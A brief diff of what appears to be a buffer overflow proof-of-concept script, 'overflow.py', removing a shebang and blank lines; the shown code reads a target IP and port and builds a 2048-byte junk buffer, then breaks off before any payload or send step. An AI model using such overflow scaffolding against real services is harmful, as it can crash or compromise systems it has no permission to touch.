@@ -1,15 +1,11 @@
-#!/usr/bin/env python3
-
 import socket
 import sys
 
 # how to execute:
 # python overflow.py 192.168.1.109 80
 
-
 ip = sys.argv[1]
 port = int(sys.argv[2])
-
 
 junk = ("A" * 2048)
 
